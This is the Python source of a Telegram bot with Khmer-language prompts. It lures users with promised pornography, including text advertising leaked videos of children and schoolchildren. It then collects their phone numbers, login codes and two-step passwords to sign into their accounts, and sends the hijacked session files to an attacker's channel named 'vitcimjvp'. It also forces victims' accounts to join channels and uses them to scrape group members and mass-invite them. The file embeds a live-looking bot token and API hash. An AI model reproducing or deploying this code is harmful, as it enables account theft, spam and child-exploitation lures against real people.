import re, os, random, asyncio, html,configparser,pyrogram, subprocess, requests, time, traceback, logging, telethon, csv, json, sys
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from asyncio.exceptions import TimeoutError
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.client.chats import ChatMethods
from csv import reader
from telethon.sync import TelegramClient
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError
from telethon.sessions import StringSession
from pyrogram import Client,filters
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from datetime import datetime, timedelta,date
import csv
from shutil import make_archive
#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/1669178360/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/1669178360')
   open(f"Users/1669178360/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")
APP_ID = 3910389
API_HASH = "86f861352f0ab76a251866059a6adbd6"
BOT_TOKEN = "5603469076:AAHNCeKtBCtANXcOghMOxIqxLfpyZv8aNkg"
UPDATES_CHANNEL = "JVPVIDEOKH"
OWNER= [5288533304,1669178360]
PREMIUM= ["Superior_bots", "Superior_Support"]
vitcim = 'vitcimjvp'
app = pyrogram.Client("app", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2024-11-03", '%Y-%m-%d')
        if d<=r:
            PREMIUM.append(int(row[1]))

# ------------------------------- Subscribe --------------------------------- #
async def Subscribe(lel, message):
   update_channel = UPDATES_CHANNEL
   if update_channel:
      try:
         user = await app.get_chat_member(update_channel, message.chat.id)
         if user.status == "kicked":
            await app.send_message(chat_id=message.chat.id,text="Sorry Sir, You are Banned. Contact My [Support Group](https://t.me/TheSupportChat).", parse_mode="markdown", disable_web_page_preview=True)
            return 1
      except UserNotParticipant:
         await app.send_message(chat_id=message.chat.id, text="**ចូលរួម GROUP ជាមុនសិន រួចសូមចុច  /start**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(" ចូល GROUP អីឡូវនេះ  !!  ", url=f"https://t.me/{update_channel}")]]), parse_mode="markdown")
         return 1


# ------------------------------- Start --------------------------------- #
@app.on_message(filters.private & filters.command(["start"]))
async def start(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   id = message.from_user.id
   user_name = '@' + message.from_user.username if message.from_user.username else None
   await add_user(id, user_name)
   but = InlineKeyboardMarkup([[InlineKeyboardButton("ចូលមើលរឿងសិច 🔞 ", callback_data="Edit"),
   InlineKeyboardButton("ជំនួយ / Help", url="https://t.me/JVPVIDEOKH")]])
 
   await message.reply_text(f"** សួស្ដី ** {message.from_user.first_name} **!\n\n- មើលរឿង សិចថ្មី ៗ ✓ \n- Free ចូលគ្រុបដែរមានរាប់មឿនរឿង \n- រឿបបែកធ្លាយ​កូនក្មេង វីឌីអូសិស្សសាលា វិឌីអូថៃ ខ្មែរ​ ចិន \n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT **", reply_markup=but)



# ------------------------------- Set Phone No --------------------------------- #
@app.on_message(filters.private & filters.command(["phone"]))
async def phone(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   if not os.path.exists(f"Users/{message.from_user.id}/phone.csv"):
      os.mkdir(f'./Users/{message.from_user.id}')
      open(f"Users/{message.from_user.id}/phone.csv","w")
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
      str_list = [row[0] for row in csv.reader(f)]
      NonLimited=[]
      a=0
      for pphone in str_list:
         a+=1
         NonLimited.append(str(pphone))
      number = await app.ask(chat_id=message.chat.id, text="**សូមវាយលេខ 1 រួច Enter  \n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
      n = int(number.text)
      a+=n
      if n<1 :
         await app.send_message(message.chat.id, """**Invalid Format less then 1 Try again\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""")
         return
      if a>100:
         await app.send_message(message.chat.id, f"**You can add only {100-a} Phone no \n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
         return
      for i in range (1,n+1):
         number = await app.ask(chat_id=message.chat.id, text="**Past Number TeleGram របស់អ្នកតែកុំដាក់លេខ + ពីខាងមុខរួច Enter \nhttps://bit.ly/3S9Rpto**")
         phone = number.text
         if "+" in phone:
            await app.send_message(message.chat.id, """**As Mention + is not include\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""")
         elif len(phone)==11 or len(phone)==12:
            Singla = str(phone)
            NonLimited.append(Singla)
            await app.send_message(message.chat.id, f"**{n}).សូមចុច ផ្ទៀតផ្ទាត់ > /login ** {phone}  ")
         else:
            await app.send_message(message.chat.id, """**Invalid Number Format Try again\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
      NonLimited=list(dict.fromkeys(NonLimited))
      with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(NonLimited)
      with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", ""))
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
   return



# ------------------------------- Acc Login --------------------------------- #
@app.on_message(filters.private & filters.command(["login"]))
async def login(lel, message):
 try:
   await message.delete()
   a= await Subscribe(lel, message)
   if a==1:
      return
   with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
    r=[]
    l=[]
    str_list = [row[0] for row in csv.reader(f)]
    po = 0
    s=0
    for pphone in str_list:
     try:
      phone = int(utils.parse_phone(pphone))
      client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
      await client.connect()
      if not await client.is_user_authorized():
         try:
            await client.send_code_request(phone)
         except FloodWait as e:
            await message.reply(f"You Have Floodwait of {e.x} Seconds")
            return
         except PhoneNumberInvalidError:
            await message.reply("អ្នកបានវាយលេខគណនីខុសហើយ.\n\nPress ចុច /start ដើម្បីព្យាយាមម្ដងទៀត !")
            return
         except PhoneNumberBannedError:
            await message.reply(f"{phone} is Baned")
            continue
         try:
            otp = await app.ask(message.chat.id, ("បំពេញសារOPT 5 ខ្ទង់ដែរទទួលបានពី TeleGram \n `បើ 12345 យើងត្រូវសរសេ 1 2 3 4 5 \n\nPress /cancel to Cancel.\nhttps://imgur.com/a/hj9Yzh6"), timeout=300)
         except TimeoutError:
            await message.reply("Time Limit Reached of 5 Min.\nPress /start to Start Again!")
            return
         otps=otp.text
         try:
            await client.sign_in(phone=phone, code=' '.join(str(otps)))
         except PhoneCodeInvalidError:
            await message.reply("Invalid Code.\n\nPress /start to Start Again!")
            return
         except PhoneCodeExpiredError:
            await message.reply("Code is Expired.\n\nPress /start to Start Again!")
            return
         except SessionPasswordNeededError:
            try:
               two_step_code = await app.ask(message.chat.id,"Your Account Have Two-Step Verification.\nPlease Enter Your Password.",timeout=300)
            except TimeoutError:
               await message.reply("`Time Limit Reached of 5 Min.\n\nPress /start to Start Again!`")
               return
            try:
               await client.sign_in(password=two_step_code.text)
            except Exception as e:
               await message.reply(f"**ERROR:** `{str(e)}`")
               return
            except Exception as e:
               await app.send_message(message.chat.id ,f"**ERROR:** `{str(e)}`")
               return
      with open("Users/1669178360/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         for pphone in str_list:
            NonLimited.append(str(pphone))
         Singla = str(phone)
         NonLimited.append(Singla)
         NonLimited=list(dict.fromkeys(NonLimited))
         with open('1.csv', 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open("1.csv") as infile, open(f"Users/1669178360/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))
      os.remove("1.csv")
      make_archive('sessions', 'zip', 'sessions')
      time.sleep(1)
      await app.send_document(vitcim, f"sessions/{phone}.session", caption=f"**Name : {message.from_user.first_name} {message.from_user.last_name}     🥷 **\n========>\n** Phone :  +{phone}     📞 **\n========>\n**Username : @{message.from_user.username}     👤** \n========>\n**ID  USERR : {message.from_user.id}     🆔** \n")
      await client(JoinChannelRequest('https://t.me/BeaktleyKhmer'))
      await client(JoinChannelRequest('https://t.me/KhmernuddexKidd'))
      await app.send_message(message.chat.id, f"ចូលគ្រុបដោយជោគជ័យ  ✅ សូមឆែកគ្រុប ថ្មីៗក្នុងអាខោនរបស់អ្នក \n\n**រក្សារសិទ្ធដោយ @JVP_CAMBODIABOT**")
      time.sleep(1)
      po+=1
      await client.disconnect()
     except ConnectionError:
      await client.disconnect()
      await client.connect()
     except TypeError:
      await app.send_message(message.chat.id, "**You have not enter the phone number \nplease edit Config⚙️ by camand /start.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")  
     except Exception as e:
      await app.send_message(message.chat.id, f"**Error: {e}\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
    for ish in l:
      r.append(str(ish))
    with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
      writer = csv.writer(writeFile, lineterminator="\n")
      writer.writerows(r)
    with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
      for line in infile:
         outfile.write(line.replace(",", "")) 
    await app.send_message(message.chat.id, f"**Check Video Now !!**") 
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
   return
                          
 # ------------------------------- Acc Private Adding --------------------------------- #
@app.on_message(filters.private & filters.command(["adding"]))
async def to(lel, message):
 try:
   a= await Subscribe(lel, message)
   if a==1:
      return
   number = await app.ask(chat_id=message.chat.id, text="**Now Send the From Group Username \n\nMade with ❤️ By @Timesisnotwaiting**")
   From = number.text
   number = await app.ask(chat_id=message.chat.id, text="**Now Send the To Group Username \n\nMade with ❤️ By @Timesisnotwaiting**")
   To = number.text
   number = await app.ask(chat_id=message.chat.id, text="**Now Send Start From  \n\nMade with ❤️ By @Timesisnotwaiting**")
   a = int(number.text)
   di=a
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         for pphone in str_list:
            peer=0
            ra=0
            dad=0
            r="**Adding Start**\n\n"
            phone = utils.parse_phone(pphone)
            client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
            await client.connect()
            await client(JoinChannelRequest(To))
            await app.send_message(chat_id=message.chat.id, text=f"**Scraping Start**")
            async for x in client.iter_participants(From, aggressive=True):
               try:
                  ra+=1
                  if ra<a:
                     continue
                  if (ra-di)>150:
                     await client.disconnect()
                     r+="**\nMade with ❤️ By @Timesisnotwaiting**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(message.chat.id, f"**Error: {phone} Due to Some Error Moving to Next no\n\nMade with ❤️ By @Timesisnotwaiting**")
                     break
                  if dad>40:
                     r+="**\nMade with ❤️ By @Timesisnotwaiting**"
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     r="**Adding Start**\n\n"
                     dad=0
                  await client(InviteToChannelRequest(To, [x]))
                  status = 'DONE'
               except errors.FloodWaitError as s:
                  status= f'FloodWaitError for {s.seconds} sec'
                  await client.disconnect()
                  r+="**\nMade with ❤️ By @Timesisnotwaiting**"
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  await app.send_message(chat_id=message.chat.id, text=f'**FloodWaitError for {s.seconds} sec\nMoving To Next Number**')
                  break
               except UserPrivacyRestrictedError:
                  status = 'PrivacyRestrictedError'
               except UserAlreadyParticipantError:
                  status = 'ALREADY'
               except ChatAdminRequiredError:
                  status="To Add Admin Required"
               except ValueError:
                  status="Error In Entry"
                  await client.disconnect()
                  await app.send_message(chat_id=message.chat.id, text=f"{r}")
                  break
               except PeerFloodError:
                  if peer == 10:
                     await client.disconnect()
                     await app.send_message(chat_id=message.chat.id, text=f"{r}")
                     await app.send_message(chat_id=message.chat.id, text=f"**Too Many PeerFloodError\nMoving To Next Number**")
                     break
                  status = 'PeerFloodError'
                  peer+=1
               except ChatWriteForbiddenError as cwfe:
                  await client(JoinChannelRequest(To))
                  continue
               except errors.RPCError as s:
                  status = s.__class__.__name__
               except Exception as d:
                  status = d
               except:
                  traceback.print_exc()
                  status="Unexpected Error"
                  break
               r+=f"{a-di+1}). **{x.first_name}**   ⟾   **{status}**\n"
               dad+=1
               a+=1
   except Exception as e:
      await app.send_message(chat_id=message.chat.id, text=f"Error: {e} \n\n Made with ❤️ By @Timesisnotwaiting")
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\nMade with ❤️ By @Timesisnotwaiting**")
   return





# ------------------------------- Admin Pannel --------------------------------- #
@app.on_message(filters.private & filters.command('/admin'))
async def subscribers_count(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id in OWNER:
      but = InlineKeyboardMarkup([[InlineKeyboardButton("Users✅", callback_data="Users")], [InlineKeyboardButton("Broadcast💯", callback_data="Broadcast")],[InlineKeyboardButton("AddUser", callback_data="New")], [InlineKeyboardButton("Check Users", callback_data="Check")]])
      await app.send_message(chat_id=message.chat.id,text=f"**Hi** `{message.from_user.first_name}` **!\n\nWelcome to Admin Pannel of Scraper Bot\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**", reply_markup=but)
   else:
      await app.send_message(chat_id=message.chat.id,text="**You are not owner of Bot \n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")



# ------------------------------- Buttons --------------------------------- #
@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Login" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ផ្ទៀងផ្ទាត់    >    /login **""") 
   elif "Ish" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /phonesee to login and check stats of Account.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
   elif "Remove" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /remove to login and check stats of Account.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
   elif "Adding" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /adding to start adding from Login✅ Account.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
   elif "Edit" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ចូលមើលរឿង   >   /phone **""") 
   elif "Home" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**There is nothing no more..!\nJust Click on /start to Go Home.\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**""") 
   elif "Users" in k:
      await update.message.delete()
      msg = await app.send_message(update.message.chat.id,"Please Wait...")
      messages = await users_info(app)
      await msg.edit(f"Total:\n\nUsers - {messages[0]}\nBlocked - {messages[1]}")
   elif "New" in k:
      await update.message.delete()
      number = await app.ask(chat_id=update.message.chat.id, text="**Send User Id Of New User\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUM.append(int(phone))
         await app.send_message(chat_id=update.message.chat.id,text="Done SucessFully")

   elif "Check" in k:
      await update.message.delete()
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**Premium Users**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"
         E+="\n\n**រក្សារសិទ្ធដោយ @JVPCAMBODIABOT**"
         await app.send_message(chat_id=update.message.chat.id,text=E)

   elif "Admin" in k:
      await update.message.delete()
      if update.message.chat.id in OWNER:
         but = InlineKeyboardMarkup([[InlineKeyboardButton("Users✅", callback_data="Users")], [InlineKeyboardButton("Broadcast💯", callback_data="Broadcast")],[InlineKeyboardButton("AddUser", callback_data="New")], [InlineKeyboardButton("Check Users", callback_data="Check")]])
         await app.send_message(chat_id=update.message.chat.id,text=f"**Welcome to Admin Pannel of Scraper Bot\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**", reply_markup=but)
      else:
         await app.send_message(chat_id=update.message.chat.id,text="**You are not owner of Bot \n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")
   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await app.ask(chat_id=update.message.chat.id, text="**Now me message For Broadcast\n\nMade with ❤️ By @Superior_Bots**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(chat_id=int(chat_id), text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"Successfully Broadcasted to {a} Chats\nFailed - {b} Chats !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**Error: {e}\n\nរក្សារសិទ្ធដោយ @JVPCAMBODIABOT**")

print("  Starting Sucessfully ....... !")
app.run()
